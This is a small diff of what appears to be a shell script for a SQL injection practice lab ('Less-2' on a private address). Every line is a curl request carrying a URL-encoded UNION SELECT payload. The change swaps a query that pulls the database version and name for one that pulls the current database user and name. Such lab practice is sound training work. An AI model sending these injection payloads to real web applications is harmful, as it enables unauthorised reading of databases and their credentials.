@@ -2,4 +2,5 @@
 
 #curl "http://192.168.1.48:8081/Less-2/?id=1"
 #curl "http://192.168.1.48:8081/Less-2/?id=100%20union%20select%201%2C2%2C3%23"
-curl "http://192.168.1.48:8081/Less-2/?id=100%20union%20select%201%2Cversion%28%29%2Cdatabase%28%29%23"
+#curl "http://192.168.1.48:8081/Less-2/?id=100%20union%20select%201%2Cversion%28%29%2Cdatabase%28%29%23"
+curl "http://192.168.1.48:8081/Less-2/?id=100%20union%20select%201%2Cuser%28%29%2Cdatabase%28%29%23"
